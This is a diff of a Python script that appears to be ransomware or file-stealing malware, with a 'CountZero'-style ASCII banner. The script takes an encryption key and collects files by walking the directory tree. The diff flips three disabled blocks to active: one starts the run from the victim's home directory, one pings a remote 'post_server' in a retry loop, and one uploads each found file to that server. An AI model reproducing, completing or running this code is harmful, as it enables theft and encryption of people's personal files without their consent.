@@ -24,12 +24,12 @@ if len(sys.argv) != 2:
     print("You need to pass one encryption key.")
     sys.exit()
 else:
-    key = sys.argv[1].encode("utf8")
+    key = sys.argv[1].encode("utf-8")
 
 # ---------------------------------------------------------------------- #
 # Try to initialize on home:
 # ---------------------------------------------------------------------- #
-if False:
+if True:
     try:
         os.chdir(str(Path.home()))
     except Exception as error:
@@ -93,7 +93,7 @@ for dirpath, dirs, files in os.walk(os.getcwd()):
 # ---------------------------------------------------------------------- #
 # Ping seerver & Upload:
 # ---------------------------------------------------------------------- #
-if False:
+if True:
     while True:
         ping = os.system("ping -c 1 " + post_server[:-14])
         if ping == 0:
@@ -105,7 +105,7 @@ if False:
                 sleep(300)
                 continue
 # Upload:
-if False:
+if True:
     # Send files
     for f in tool.files_found:
         tmp_data = open(f, "rb")
@@ -150,8 +150,8 @@ for f in tool.files_found:
 # ---------------------------------------------------------------------- #
 message = """_________                      __    __________
 \_   ___ \  ____  __ __  _____/  |_  \____    /___________  ____
-/    \  \/ /  _ \|  |  \/    \   __\   /     // __ \_  __ \/  _ \
-\     \___(  <_> )  |  /   |  \  |    /     /\  ___/|  | \(  <_> )
+/    \  \/ /  _ \|  |  \/    \   __\   /     // __ \_  __ \/  _ \ 
+\     \___(  <_> )  |  /   |  \  |    /     /\  ___/|  | \(  <_> ) 
  \______  /\____/|____/|___|  /__|   /_______ \___  >__|   \____/
         \/                  \/               \/   \/
 
